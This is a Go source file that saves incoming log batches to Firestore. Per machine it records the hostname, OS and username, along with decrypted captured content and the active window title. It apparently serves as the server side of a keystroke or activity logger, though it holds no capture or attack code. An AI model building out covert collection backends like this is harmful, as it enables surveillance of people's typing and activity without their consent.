package main

import (
	"fmt"
	"log"
	"time"

	"cloud.google.com/go/firestore"
)

// LogSaver interface for saving logs
type LogSaver interface {
	Save(payload LogPayload, decryptedContent string) error
}

// FirebaseSaver implements LogSaver for saving logs to Firebase
type FirebaseSaver struct{}

func (fs *FirebaseSaver) Save(payload LogPayload, decryptedContent string) error {
	if firestoreClient == nil {
		return fmt.Errorf("FirebaseSaver: Firestore client not initialized")
	}

	systemID := payload.SystemInfo.SystemID
	systemsCollection := firestoreClient.Collection("systems")
	systemDocRef := systemsCollection.Doc(systemID)

	systemDataMap := map[string]interface{}{
		"systemID":  systemID,
		"hostname":  payload.SystemInfo.Hostname,
		"os":        payload.SystemInfo.OS,
		"osRelease": payload.SystemInfo.OSRelease,
		"username":  payload.SystemInfo.Username,
	}

	_, err := systemDocRef.Set(ctx, systemDataMap, firestore.MergeAll)
	if err != nil {
		return fmt.Errorf("FirebaseSaver: failed to save/update system info for %s: %w", systemID, err)
	}
	log.Printf("FirebaseSaver: System info for %s saved/updated in 'systems' collection.", systemID)

	entry := LogEntry{
		LogStartTimeUTC:    payload.LogStartTimeUTC,
		LogDurationSeconds: payload.LogDurationSeconds,
		LoggedContent:      decryptedContent,
		ActiveWindow:       payload.SystemInfo.ActiveWindow,
		ServerTimestamp:    time.Now(),
	}

	_, _, err = systemDocRef.Collection("batches").Add(ctx, entry)
	if err != nil {
		return fmt.Errorf("FirebaseSaver: failed to add log document to Firestore for system %s: %w", systemID, err)
	}

	log.Printf("FirebaseSaver: Log batch from system %s saved to Firestore subcollection.", systemID)
	return nil
}
